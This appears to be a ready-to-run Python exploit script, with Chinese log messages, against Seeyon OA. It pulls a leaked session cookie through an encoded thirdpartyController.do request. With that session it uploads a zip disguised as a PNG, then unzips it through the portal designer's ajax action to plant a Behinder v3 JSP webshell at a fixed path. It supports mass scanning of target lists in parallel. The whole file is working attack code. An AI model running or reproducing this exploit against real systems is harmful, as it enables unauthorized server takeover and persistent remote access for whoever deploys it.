# -*- coding: utf-8 -*-

import re
import time
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def fileUpload(target_url, cookie):
    vuln_url = target_url + 'seeyon/fileUpload.do?method=processUpload'
    console.print(now_time() + ' [INFO]     开始上传zip文件', style='bold blue')
    files = [('file1', ('test.png', open('poc/TEST233.zip', 'rb'), 'image/png'))]
    header = {'Cookie': 'JSESSIONID=%s' % cookie}
    data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0', 'isEncrypt': "0"}
    try:
        r = requests.post(vuln_url, headers=header, data=data, files=files, timeout=3, verify=False)
        firename = re.findall('fileurls=fileurls\+","\+\'(.+)\'', r.text, re.I)
        if len(firename) == 0:
            console.print(now_time() + ' [WARNING]  zip文件上传失败', style='bold red')
        else:
            console.print(now_time() + ' [INFO]     zip文件上传成功', style='bold blue')
            unzip(header, target_url, firename)
    except:
        console.print(now_time() + ' [WARNING]  zip文件上传失败', style='bold red')


def unzip(header, target_url, firename):
    vuln_url = target_url + 'seeyon/ajax.do'
    nowtime = time.strftime('%Y-%m-%d')
    data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + nowtime + '%22%2C%22' + \
           firename[0] + '%22%5D'
    header['Content-Type'] = 'application/x-www-form-urlencoded'
    console.print(now_time() + ' [INFO]     开始解压zip文件', style='bold blue')
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 500:
            shell_url = target_url + 'seeyon/common/designer/pageLayout/test233.jsp'
            if requests.get(shell_url, timeout=3, verify=False).status_code == 200:
                console.print(now_time() + ' [SUCCESS]  zip文件解压成功, 冰蝎三默认WebShell: {}'.format(shell_url),
                              style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  致远OA Session泄露 任意文件上传漏洞利用失败', style='bold red')
        else:
            console.print(now_time() + ' [WARNING]  zip文件解压失败', style='bold red')
    except:
        console.print(now_time() + ' [WARNING]  zip文件解压失败', style='bold red')


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + 'seeyon/thirdpartyController.do'
    console.print(now_time() + " [INFO]     正在检测致远OA Session泄露 任意文件上传漏洞", style='bold blue')
    #console.print(now_time() + " [INFO]     正在请求: {}".format(vuln_url), style='bold blue')
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 200 and "a8genius.do" in r.text and 'set-cookie' in str(r.headers).lower():
            cookies = requests.utils.dict_from_cookiejar(r.cookies)
            cookie = cookies['JSESSIONID']
            console.print(now_time() + ' [INFO]     成功获取到Session: {}'.format(cookie), style='bold green')
            fileUpload(target_url, cookie)
        else:
            console.print(now_time() + ' [WARNING]  获取Session失败', style='bold red')
    except:
        console.print(now_time() + ' [WARNING]  请求失败', style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
